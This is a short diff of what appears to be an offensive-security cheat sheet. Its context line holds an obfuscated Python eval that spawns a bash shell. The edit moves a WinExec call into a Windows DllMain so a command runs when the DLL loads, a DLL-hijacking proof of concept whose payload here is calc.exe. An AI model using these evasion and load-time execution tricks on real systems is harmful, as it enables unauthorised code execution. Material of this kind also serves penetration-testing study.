@@ -1138,15 +1138,10 @@ eval("__impo"+"rt__('o"+"s').system('bash')")
 [Generate dll that execute command]
 ***THE CODE***
 #include <windows.h>
-int NotLahMal()
-{
- WinExec("calc.exe", 0);
- return 0;
-}
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
- NotLahMal();
+ WinExec("calc.exe", 0);
  return 0;
 }
 *************
